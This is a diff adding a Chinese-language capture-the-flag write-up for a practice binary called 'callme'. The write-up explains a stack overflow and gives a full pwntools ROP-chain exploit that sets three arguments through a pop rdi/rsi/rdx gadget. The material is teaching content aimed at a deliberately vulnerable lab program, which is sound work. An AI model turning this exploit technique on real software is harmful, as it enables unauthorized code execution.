@@ -125,3 +125,51 @@ io.interactive()
 ```
 
 得到flag：`ROPE{a_placeholder_32byte_flag!}`
+
+## 3.callme
+
+栈溢出,在function列表里看到有 **usefulfunction **分别是
+
+```c
+callme_one(a1, a2, a3)
+callme_two(a1, a2, a3)
+callme_three(a1, a2, a3)
+```
+
+ida打开另一个附件 **libcallme.so** 查看这几个函数的具体内容。可以看到想执行三个函数有一个共同条件:`a1 = 0xDEADBEEFDEADBEEF || a2 = 0xCAFEBABECAFEBABE || a3 = 0xD00DF00DD00DF00D`。在满足a1,a2,a3的参数条件后 **callme_one** 的有效内容是`fopen("encrypted_flag.dat", "r")`-->打开加密的flag文件, **callme_two** 的有效内容是 `fopen("key1.dat", "r")-->第一层解密` , **callme_three** 的有效内容是`fopen("key2.dat", "r")-->第二层解密`，也就是说我们需要按照one->two->three的顺序去依次调用这三个函数。由于每个 callme 函数都有三个参数,我们需要找三个寄存器**rdi,rsi,rdx**的 gadget 。在callme附件,可以看到usefulGadget里已经给了我们解题需要的 gadget :`pop_rdi_rsi_rdx--0x40093c` 。
+
+万事具备,套模板！
+
+```Python
+#!/usr/bin/env python3
+from pwn import *
+# 导入pwntools的相关依赖
+context.arch = 'amd64'
+elf = ELF('./callme')
+# 静态的ELF对象，可以访问符号表中的值
+io = process('./callme')
+    # 加载程序的进程
+callme_one = 0x400720
+callme_two = 0x400740
+callme_three = 0x4006F0
+a1 = 0xDEADBEEFDEADBEEF
+a2 = 0xCAFEBABECAFEBABE
+a3 = 0xD00DF00DD00DF00D
+pop_rdi_rsi_rdx = 0x40093c
+payload = flat(
+    b"1" * 40,
+    pop_rdi_rsi_rdx, a1, a2, a3,callme_one,
+    pop_rdi_rsi_rdx, a1, a2, a3,callme_two,
+    pop_rdi_rsi_rdx, a1, a2, a3,callme_three,
+)
+# 主要修改这个payload，payload里面的填充需要是bytes类型
+io.sendline(payload)
+# 将payload通过stdin发给程序
+io.interactive()
+# 进入交互模式
+```
+
+拿到flag:`ROPE{a_placeholder_32byte_flag!}`
+
+相信有细心的同学发现了,在这段脚本里我使用了 **flat** 这个函数取代了臃肿的 **payload+=** 。在ROP链里, **flat** 可以按照顺序自动把每一段payload增添到已写的payload后面。如 `pop_rdi_rsi_rdx, a1, a2, a3,callme_one` 里,**a1,a2,a3**根据顺序依次存入寄存器**rdi,rsi,rdx**,作为调用 **callme_one** 的三个参数,保证程序正常运行。在使用 **flat** 函数时，需要在脚本开头加上这样一段话 `context.arch = 'amd64'`, 让 `flat()` 使用 **64 位**打包。这是因为`flat()` 默认使用 **32位** 打包，数值太大超出了范围,会造成程序报错。
+
